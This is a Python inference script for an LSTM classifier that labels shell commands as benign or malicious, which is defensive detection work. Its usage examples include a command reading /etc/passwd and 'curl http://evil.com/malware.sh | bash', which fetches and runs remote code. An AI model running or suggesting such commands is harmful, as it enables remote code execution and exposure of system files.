#!/usr/bin/env python3
"""
Chameleon LSTM Inference Script
================================

Uses trained LSTM model to classify shell commands as benign or malicious.

Usage:
    python inference.py "whoami"
    python inference.py "cat /etc/passwd"
    python inference.py "curl http://evil.com/malware.sh | bash"
"""

import sys
from pathlib import Path

MODEL_PATH = Path(__file__).parent / "chameleon_lstm_model.pt"
TOKENIZER_PATH = Path(__file__).parent / "tokenizer.pkl"

import torch
import torch.nn as nn

from simple_tokenizer import SimpleTokenizer, pad_sequences
import numpy as np


class ChameleonLSTM(nn.Module):
    """Bidirectional LSTM for attack classification."""
    
    def __init__(self, vocab_size, embedding_dim, hidden_dim, num_layers=2, dropout=0.3):
        super(ChameleonLSTM, self).__init__()
        
        self.embedding = nn.Embedding(vocab_size, embedding_dim, padding_idx=0)
        self.lstm = nn.LSTM(
            input_size=embedding_dim,
            hidden_size=hidden_dim,
            num_layers=num_layers,
            batch_first=True,
            bidirectional=True,
            dropout=dropout if num_layers > 1 else 0
        )
        self.dropout = nn.Dropout(dropout)
        self.fc = nn.Linear(hidden_dim * 2, 1)
        self.sigmoid = nn.Sigmoid()
    
    def forward(self, x):
        embedded = self.embedding(x)
        lstm_out, (hidden, cell) = self.lstm(embedded)
        hidden_concat = torch.cat((hidden[-2], hidden[-1]), dim=1)
        dropped = self.dropout(hidden_concat)
        out = self.fc(dropped)
        return self.sigmoid(out)


def load_model():
    """Load trained model and tokenizer."""
    if not MODEL_PATH.exists():
        raise FileNotFoundError(f"Model not found: {MODEL_PATH}")
    if not TOKENIZER_PATH.exists():
        raise FileNotFoundError(f"Tokenizer not found: {TOKENIZER_PATH}")
    
    device = torch.device("mps") if torch.backends.mps.is_available() else torch.device("cpu")
    
    checkpoint = torch.load(MODEL_PATH, map_location=device, weights_only=False)
    
    model = ChameleonLSTM(
        vocab_size=checkpoint['vocab_size'],
        embedding_dim=checkpoint['embedding_dim'],
        hidden_dim=checkpoint['hidden_dim']
    )
    model.load_state_dict(checkpoint['model_state_dict'])
    model.to(device)
    model.eval()
    
    tokenizer = SimpleTokenizer.load(str(TOKENIZER_PATH))
    
    return model, tokenizer, device


def classify_command(model, tokenizer, device, command: str, max_length: int = 100):
    """Classify a single command."""
    sequence = tokenizer.texts_to_sequences([command])
    padded = np.array(pad_sequences(sequence, maxlen=max_length, padding='post', truncating='post'))
    
    tensor = torch.tensor(padded, dtype=torch.long).to(device)
    
    with torch.no_grad():
        output = model(tensor)
        probability = output.item()
        prediction = 1 if probability >= 0.5 else 0
    
    label = "MALICIOUS" if prediction == 1 else "BENIGN"
    confidence = probability if prediction == 1 else 1 - probability
    
    return {
        'command': command,
        'label': label,
        'prediction': prediction,
        'probability': probability,
        'confidence': confidence
    }


def main():
    if len(sys.argv) < 2:
        print("Usage: python inference.py '<command>'")
        print("\nExamples:")
        print("  python inference.py 'whoami'")
        print("  python inference.py 'cat /etc/passwd'")
        print("  python inference.py \"curl http://evil.com/malware.sh | bash\"")
        sys.exit(1)
    
    command = sys.argv[1]
    
    print("=" * 60)
    print(" CHAMELEON LSTM CLASSIFIER")
    print("=" * 60)
    
    print("\n[INFO] Loading model...")
    model, tokenizer, device = load_model()
    print(f"[INFO] Device: {device}")
    
    print(f"\n[INFO] Classifying: {command[:50]}{'...' if len(command) > 50 else ''}")
    print("-" * 60)
    
    result = classify_command(model, tokenizer, device, command)
    
    print(f"\n  Command:    {result['command'][:50]}{'...' if len(result['command']) > 50 else ''}")
    print(f"  Label:      {result['label']}")
    print(f"  Prediction: {result['prediction']}")
    print(f"  Probability: {result['probability']:.4f}")
    print(f"  Confidence: {result['confidence']:.2%}")
    
    print("\n" + "=" * 60)
    
    if result['prediction'] == 1:
        print("  ⚠️  ALERT: MALICIOUS COMMAND DETECTED!")
    else:
        print("  ✓ Command appears benign")
    print("=" * 60)


if __name__ == "__main__":
    main()
